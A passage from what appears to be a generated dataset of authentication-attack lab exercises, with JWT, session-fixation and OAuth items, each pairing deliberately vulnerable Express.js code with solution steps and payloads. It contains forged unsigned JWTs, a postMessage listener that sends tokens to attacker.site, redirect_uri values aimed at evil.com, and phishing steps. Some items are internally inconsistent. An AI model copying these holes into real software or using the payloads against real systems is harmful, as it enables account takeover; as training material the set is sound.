  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const fs = require('fs'); const jwt = require('jsonwebtoken'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.post('/authService', (req, res) => { const token = req.body?.Envelope?.Header?.[0]?.AuthToken?.[0]; const decodedHeader = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()); const secret = fs.readFileSync(decodedHeader.kid); try { const verified = jwt.verify(token, secret); if (verified.username === 'carlos') { res.send('<soap:Envelope><soap:Body>Access Granted</soap:Body></soap:Envelope>'); } else { res.send('<soap:Envelope><soap:Body>Access Denied</soap:Body></soap:Envelope>'); } } catch { res.send('<soap:Envelope><soap:Body>Invalid Token</soap:Body></soap:Envelope>'); } }); app.listen(5000);",
  "payloads": [
    "{ \"alg\": \"HS256\", \"kid\": \"../../public.pem\" }",
    "JWT header: eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL3B1YmxpYy5wZW0ifQ==",
    "JWT payload: eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ=="
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in client-side implicit grant flow",
  "Lab Description": "The application uses OAuth with implicit flow for single-page applications. It trusts any `redirect_uri` that matches the domain but fails to validate origin during `postMessage`. An attacker can inject a malicious frame to steal tokens. To solve: Steal Carlos's access token using a crafted frame and use it to access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to retrieve a valid OAuth authorization URL from /auth?client_id=spaclient&response_type=token.",
    "Craft a malicious HTML page that loads the login endpoint in an iframe and listens for postMessage from the origin.",
    "Send the URL to Carlos using social engineering and capture the access token via postMessage hijack.",
    "Replay the access token in an Authorization header using Burp to access /my-account.",
    "Verify Carlos's account access using the stolen token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token-carlos-abc123' }; app.get('/auth', (req, res) => { const { client_id, response_type, redirect_uri } = req.query; if (client_id === 'spaclient' && response_type === 'token') { res.redirect(`${redirect_uri}#access_token=token-carlos-abc123`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Welcome carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(7000);",
  "payloads": [
    "<iframe src='https://vulnerable.app/auth?client_id=spaclient&response_type=token&redirect_uri=https://attacker.site/capture.html'></iframe>",
    "window.addEventListener('message', e => fetch('https://attacker.site/log?token=' + e.data))",
    "Authorization: Bearer token-carlos-abc123"
  ]
},
{
  "Lab scenario": "Session fixation in login flow with cookie reuse",
  "Lab Description": "The application contains a session fixation vulnerability within its authentication logic. It allows unauthenticated users to assign session identifiers that are not reset during login. The application accepts a session cookie before login and continues using it post-authentication. To solve: Fixate your session before login, authenticate as Carlos, and access his My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. In Burp Suite, intercept a GET /login request before logging in. Note the Set-Cookie: sessionid value assigned.",
    "2. Use Burp to send a crafted link with your chosen sessionid to Carlos or set it manually as a valid cookie.",
    "3. Log in with Carlos's credentials while your pre-defined sessionid is active.",
    "4. Observe that the sessionid does not change after login, confirming session fixation.",
    "5. Use the fixed sessionid to access /account and confirm access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': 'hunter2' }; const sessions = {}; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substring(2); res.cookie('sessionid', sid); sessions[sid] = { loggedIn: false }; } res.send('Login Page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; if (users[username] === password) { sessions[sid] = { loggedIn: true, user: username }; res.redirect('/account'); } else { res.send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.loggedIn) { res.send(`Welcome ${sessions[sid].user}`); } else { res.status(401).send('Not logged in'); } }); app.listen(3000);",
  "payloads": [
    "GET /login with custom sessionid injected",
    "POST /login with credentials: carlos:hunter2 and sessionid unchanged",
    "GET /account with sessionid to confirm access"
  ]
},
{
  "Lab scenario": "JWT tampering due to none algorithm in token verification",
  "Lab Description": "The application uses JWT tokens for user authentication. It does not properly validate the token signature if the 'alg' header is set to 'none'. The application trusts the token without signature verification. To solve: Craft a JWT for Carlos with alg=none and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to log in with your own credentials and capture the JWT from the Authorization header.",
    "2. Decode the JWT in jwt.io or use Postman’s JWT debugger. Observe the payload structure and header fields.",
    "3. Modify the 'alg' header to 'none' and change the payload 'sub' to 'carlos'.",
    "4. Remove the signature section completely and re-encode the JWT using base64url encoding.",
    "5. Send a GET /account request with the tampered token in the Authorization header and verify access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'insecurekey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Access granted to ${payload.sub}`); } else { try { const payload = jwt.verify(token, SECRET); res.send(`Access granted to ${payload.sub}`); } catch (e) { res.status(403).send('Invalid token'); } } }); app.listen(4000);",
  "payloads": [
    "Header: { \"alg\": \"none\" }, Payload: { \"sub\": \"carlos\" }, No signature",
    "Authorization: Bearer <tampered_token>"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration in redirect handling",
  "Lab Description": "This application implements OAuth using the implicit flow. The redirection URI is not properly validated, allowing open redirect and token leakage. The application trusts the redirect_uri without strict validation. To solve: Exploit the redirect_uri to capture Carlos’s access token and use it to access the protected /account endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP or Burp Suite to observe the OAuth flow during login. Capture the GET /authorize?client_id=X&redirect_uri=... request.",
    "2. Identify that the redirect_uri is weakly validated and allows external domains with similar patterns.",
    "3. Set up a malicious server to capture tokens from URL fragments.",
    "4. Craft a URL with redirect_uri pointing to your malicious endpoint, and trick Carlos into visiting it.",
    "5. Capture the access_token from the fragment, then send it in the Authorization header to GET /account and verify access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'carlos': 'access-token-123' }; app.get('/authorize', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; const user = 'carlos'; const token = oauthTokens[user]; if (response_type === 'token') { res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === oauthTokens['carlos']) { res.send('Welcome Carlos!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
  "payloads": [
    "GET /authorize?client_id=app123&redirect_uri=https://attacker.com/callback&response_type=token",
    "Captured: #access_token=access-token-123",
    "Authorization: Bearer access-token-123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token validation",
  "Lab Description": "This lab uses JSON Web Tokens (JWT) for session handling and is vulnerable to algorithm confusion. The application accepts tokens signed with 'none' instead of verifying them. To solve: craft a forged JWT token to impersonate the admin user and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a valid JWT token from a logged-in session.",
    "2. Decode the JWT using jwt.io or Burp Decoder and observe the 'alg' field is set to HS256.",
    "3. Modify the JWT header to set 'alg' to 'none' and change the payload 'username' to 'admin'.",
    "4. Remove the signature part and forward the modified token using Burp Repeater.",
    "5. Access /admin route using the forged JWT to verify admin access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secretkey'); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'admin') return res.send('Welcome admin'); } try { const verified = jwt.verify(token, 'secretkey'); if (verified.username === 'admin') return res.send('Welcome admin'); } catch (err) { return res.status(401).send('Invalid token'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
  ]
},
{
  "Lab scenario": "Session fixation via token reuse in login flow",
  "Lab Description": "This application improperly binds session tokens to user identity. A malicious user can fixate a victim's session by planting a session cookie before login. To solve: hijack Carlos's session by fixing the session cookie and accessing his account page after he logs in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to capture a request before login and observe the 'sessionid' cookie.",
    "2. Copy the sessionid value and set it as your session cookie.",
    "3. Trick Carlos into logging in using the sessionid you provided (simulate via forced browsing or social engineering).",
    "4. After Carlos logs in, reuse the fixed sessionid to access /my-account.",
    "5. Confirm access to Carlos’s account using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionid || Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('sessionid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user === 'carlos') return res.send('Account page for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "sessionid=attackerfixedid",
    "GET /login?username=carlos&password=pass123 with attackerfixedid as cookie",
    "GET /my-account with sessionid=attackerfixedid"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows token reuse",
  "Lab Description": "This app uses OAuth for third-party authentication. It incorrectly accepts ID tokens from any issuer, failing to validate the issuer and audience. To solve: reuse an ID token from another provider to log in as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Log in using a different OAuth provider and intercept the ID token in the response using Burp Suite.",
    "2. Decode the JWT and observe the 'sub' and 'iss' claims.",
    "3. Modify the payload 'sub' to 'carlos' and change 'iss' to a fake issuer, re-sign the JWT using your own private key.",
    "4. Send the forged token in Authorization: Bearer header to the /auth/callback endpoint.",
    "5. Verify you are now logged in as Carlos by accessing /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const validUsers = ['carlos', 'alice']; app.post('/auth/callback', (req, res) => { const token = req.body.id_token; const decoded = jwt.decode(token, { complete: true }); const sub = decoded.payload.sub; if (validUsers.includes(sub)) return res.send(`Logged in as ${sub}`); res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MiLCJpc3MiOiJmYWtlLWlzc3VlciJ9.fake-signature",
    "POST /auth/callback { \"id_token\": \"eyJ...\" }"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion vulnerability in login API",
  "Lab Description": "The login endpoint uses JWTs for authentication but does not enforce strict algorithm verification. The application trusts the 'alg' field from the JWT header. To solve: forge a valid JWT token for the user 'carlos' and access their account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Capture login JWT using Burp Suite after a successful login with your own account.",
    "Send the token to jwt.io and decode it. Observe that the 'alg' header is set to HS256.",
    "Replace the 'alg' with 'none' and remove the signature entirely.",
    "Change the payload 'username' value to 'carlos'.",
    "Send the forged token in the Authorization header using Postman and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 's3cr3t' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.verify(token, 'supersecret'); res.send('Welcome ' + decoded.username); }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
  "payloads": [
    "{\"alg\":\"none\",\"typ\":\"JWT\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "Session fixation via vulnerable login redirect",
  "Lab Description": "The login process does not invalidate pre-existing session cookies and reuses them after login. The application fails to issue a new session ID upon successful authentication. To solve: fixate a session ID for 'carlos' and hijack his session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to generate a new session cookie by visiting /login without authenticating.",
    "Share the session ID with the victim using a phishing email or crafted link.",
    "Victim logs in using the fixed session, which remains unchanged.",
    "Use the same session ID to access /my-account as the victim.",
    "Verify access to Carlos’s account page using the fixated session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnerable', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); req.session.user = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (!req.session.user) return res.status(403).send('Forbidden'); res.send('Welcome to ' + req.session.user + '\'s account'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "GET /login HTTP/1.1",
    "Set-Cookie: connect.sid=knownsessionid",
    "POST /login with known connect.sid",
    "GET /my-account with known connect.sid"
  ]
},
{
  "Lab scenario": "OAuth implicit grant misconfiguration in third-party login",
  "Lab Description": "The application integrates with an OAuth provider using the implicit grant flow. However, it fails to validate the 'state' parameter, enabling CSRF-style token injection. To solve: steal an access token and log in as 'carlos'.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp to initiate an OAuth login flow for your own account and capture the redirect URI with access token.",
    "Craft a malicious OAuth URL replacing your token with a stolen or valid token for 'carlos'.",
    "Remove or tamper with the 'state' parameter.",
    "Send the OAuth response redirect URL to the victim via phishing.",
    "Victim clicks the link and logs in using Carlos’s access token. Use the session to access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'token-carlos', 'alice': 'token-alice' }; app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; const user = Object.keys(users).find(u => users[u] === access_token); if (!user) return res.status(401).send('Invalid token'); sessions[req.ip] = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(403).send('Not logged in'); res.send('Account of ' + user); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
  "payloads": [
    "https://example.com/oauth/callback?access_token=token-carlos",
    "https://evil.com/redirect?access_token=token-carlos",
    "Omission or manipulation of 'state' parameter"
  ]
},
{
  "Lab scenario": "Session Fixation via predictable session tokens in REST login flow",
  "Lab Description": "This lab simulates a REST-based login flow vulnerable to session fixation. The application sets session cookies prior to authentication but fails to regenerate them after login. To solve: Fixate a session ID, log in as your own user, and use the same session to authenticate as Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept pre-login GET /session request using Burp Suite to capture issued session cookie.",
    "Use Postman to login using your credentials with the pre-issued session cookie.",
    "Replay the same session cookie after modifying login body with victim's credentials.",
    "Observe that session remains unchanged and now reflects authenticated Carlos context.",
    "Access /my-account endpoint with fixed session to confirm ownership of Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notsecure', resave: false, saveUninitialized: true })); app.use(bodyParser.json()); const users = { 'wiener': 'testpass', 'carlos': 's3cret' }; app.get('/session', (req, res) => { res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Login successful'); } else { res.status(403).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not logged in'); }); app.listen(3000);",
  "payloads": [
    "GET /session",
    "POST /login {\"username\":\"wiener\", \"password\":\"testpass\"}",
    "POST /login {\"username\":\"carlos\", \"password\":\"s3cret\"} using same session cookie"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion vulnerability in GraphQL API",
  "Lab Description": "This GraphQL-based API uses JWTs for authentication but insecurely supports the 'none' algorithm. The application fails to validate signed tokens properly. To solve: Forge a JWT with 'none' algorithm and access Carlos’s account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept Authorization header after logging in with valid credentials.",
    "Decode JWT at jwt.io and analyze its algorithm and payload structure.",
    "Craft a forged token with 'alg':'none' and 'username':'carlos' using a custom script.",
    "Replace original token in Authorization header with forged JWT using Postman.",
    "Send GraphQL query `{ me { username, email } }` to validate token impersonates Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': 'secret123' }; const schema = buildSchema(`type Query { me: User } type User { username: String, email: String }`); const root = { me: (args, context) => { if (!context.user) throw new Error('Unauthorized'); return { username: context.user, email: `${context.user}@example.com` }; } }; app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization; if (auth) { const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'topsecret', { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch (e) {} } next(); }, graphqlHTTP(req => ({ schema, rootValue: root, graphiql: false, context: { user: req.user } }))); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <unsigned JWT with 'none'>",
    "GraphQL Query: { me { username, email } }"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration leaking access_token via referer header",
  "Lab Description": "This app uses OAuth 2.0 implicit grant flow for login but fails to sanitize referer headers. Tokens are leaked via open redirect endpoint after authorization. To solve: Leak Carlos’s access token and replay it to gain access.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate OAuth flow using Burp Suite and capture redirect with access_token in URL fragment.",
    "Redirect user to an attacker-controlled domain that logs the full referer.",
    "Observe that full access_token is leaked in Referer header due to misconfigured redirect_uri.",
    "Extract Carlos's access_token from Referer logs and replay it using Postman.",
    "Access /my-account endpoint with Bearer token to confirm session hijack."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token-abc123' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') res.redirect(`${redirect_uri}#access_token=token-abc123`); else res.redirect(`${redirect_uri}#error=unauthorized`); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; if (auth && auth.split(' ')[1] === 'token-abc123') res.send('Welcome Carlos'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
  "payloads": [
    "GET /oauth/authorize?redirect_uri=https://attacker.com/log&username=carlos",
    "Referer leak: https://attacker.com/log#access_token=token-abc123",
    "Authorization: Bearer token-abc123"
  ]
},
{
  "Lab scenario": "Session fixation via login CSRF",
  "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts a session cookie set prior to authentication and does not regenerate it upon login. To solve the lab, fixate a session on Carlos’s browser and access his My account page after he logs in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP or Burp Suite to capture a request to /login and observe session cookie behavior before and after login.",
    "2. Note that the session cookie (e.g., sessionId) is preserved after successful authentication.",
    "3. Construct a malicious link with a pre-defined session cookie and trick Carlos into clicking it using a CSRF delivery method.",
    "4. Wait for Carlos to log in while his browser holds your predefined session cookie.",
    "5. Reuse the same session cookie in your browser to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) { res.send('My account page for ' + req.session.username); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: sessionId=attacker-session-id",
    "POST /login HTTP/1.1\\nCookie: sessionId=attacker-session-id\\nusername=carlos&password=letmein",
    "Use <img src='/login?sessionId=attacker-session-id'> as CSRF bait"
  ]
},
{
  "Lab scenario": "JWT signature validation bypass via alg=none",
  "Lab Description": "The application relies on JWTs to manage sessions but fails to enforce the use of a strong signature algorithm. It incorrectly accepts tokens using 'alg: none'. To solve the lab, forge a valid token to impersonate the admin user and access the /admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman or Burp to intercept a request with an Authorization: Bearer header and decode the JWT.",
    "2. Observe the algorithm used in the header. Confirm the app accepts tokens signed with 'alg: none' (e.g., via test fuzzing).",
    "3. Manually craft a JWT with alg set to none and payload {\"username\": \"admin\"}. Do not sign the token.",
    "4. Send the forged token in the Authorization header to access the /admin endpoint.",
    "5. Confirm access by observing a welcome message or admin content."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.username === 'admin') return res.send('Welcome admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\" }",
    "Token: base64(header) + '.' + base64(payload) + '.'"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via referer",
  "Lab Description": "This application implements OAuth 2.0 using the implicit grant flow. Access tokens are transmitted in the URL fragment, but a misconfigured redirect leaks them via the Referer header. To solve the lab, steal Carlos’s token and access his account via the OAuth endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Start Burp Suite and proxy all traffic. Initiate the OAuth flow and observe the redirect URI structure.",
    "2. Notice the access_token is returned in the URI fragment: /callback#access_token=abc123...",
    "3. Modify your profile to include a third-party controlled redirect_uri that causes a secondary HTTP request (e.g., loading an image).",
    "4. Capture the Referer header containing the access_token using a Burp Collaborator server.",
    "5. Replay the token in an Authorization header to access Carlos’s account page at /oauth/profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send('<html><img src=\"https://attacker.com/log?ref=' + req.headers.referer + '\"></html>'); }); app.get('/oauth/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') res.send('Carlos profile'); else res.status(401).send('Invalid token'); }); app.listen(4000);",
  "payloads": [
    "redirect_uri=https://vulnerable-app.com/oauth/callback",
    "Modify profile: https://attacker.com#access_token=steal",
    "Access with Authorization: Bearer carlos-access-token"
  ]
},
{
  "Lab scenario": "JWT none algorithm bypass in Authorization header",
  "Lab Description": "This lab's authentication mechanism relies on a stateless JWT in the Authorization header. However, the server fails to properly validate the algorithm used to sign tokens. The application accepts tokens with the alg field set to 'none', which disables signature verification entirely. To solve: Forge a JWT that grants access to Carlos's account using the none algorithm.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a legitimate login and extract the JWT from the Authorization header.",
    "2. Decode the JWT using jwt.io or any Base64 decoder and inspect the header and payload structure.",
    "3. Modify the alg field in the JWT header to 'none' and change the payload to { \"username\": \"carlos\" }.",
    "4. Remove the signature portion of the JWT, then reassemble the token as header.payload.",
    "5. Send a GET request to /my-account with the forged JWT in the Authorization header using Postman or Burp Repeater."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "Session fixation via predictable session ID",
  "Lab Description": "The login system uses a session identifier that is not regenerated upon successful authentication. Additionally, the session ID is predictable and can be set by the attacker in the request. To solve: Fix a session ID before login, trick the victim into logging in, and then use the fixed session ID to impersonate them.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Intercept a GET /login request using Burp Suite and observe that the session cookie is not changed post-authentication.",
    "2. Use Burp to set the session cookie to a known fixed value like attacker-session-123 before sending the login request.",
    "3. Trick the victim into using the same session cookie (simulate with a second login request using the same session cookie).",
    "4. After the victim logs in with that session ID, use Burp Repeater to send a GET /my-account request with the same cookie.",
    "5. Confirm access to Carlos's account by verifying the personalized response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cret' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); const sid = req.cookies.session || req.query.sid || 'sess-' + Math.random().toString(36).substr(2); if (user) { sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') { res.send('Welcome carlos!'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "GET /login?username=carlos&password=s3cret HTTP/1.1\\nCookie: session=attacker-session-123",
    "GET /my-account HTTP/1.1\\nCookie: session=attacker-session-123"
  ]
},
{
  "Lab scenario": "OAuth token leakage via redirect URI manipulation",
  "Lab Description": "The application uses OAuth for login but allows open redirect behavior via an improperly validated redirect_uri parameter. This enables an attacker to capture the OAuth token by redirecting it to an external site. To solve: Exploit the open redirect to intercept Carlos's OAuth token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Start Burp and analyze the OAuth login flow. Identify the redirect_uri parameter in the authorization request.",
    "2. Change the redirect_uri to an attacker-controlled domain (e.g., https://evil.com) and send the modified link to the victim (simulate this by manually using the link).",
    "3. Observe that the OAuth token is leaked to https://evil.com via the query string.",
    "4. Copy the leaked token and use Postman to send a request to /my-account with the Bearer token in the Authorization header.",
    "5. Confirm successful access to Carlos's account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const oauthTokens = { 'valid-oauth-token': 'carlos' }; app.get('/oauth/callback', (req, res) => { const { token, redirect_uri } = req.query; if (token && oauthTokens[token]) { res.redirect(redirect_uri + '?token=' + token); } else { res.status(400).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
  "payloads": [
    "https://vulnerable-site.com/oauth/callback?token=valid-oauth-token&redirect_uri=https://evil.com",
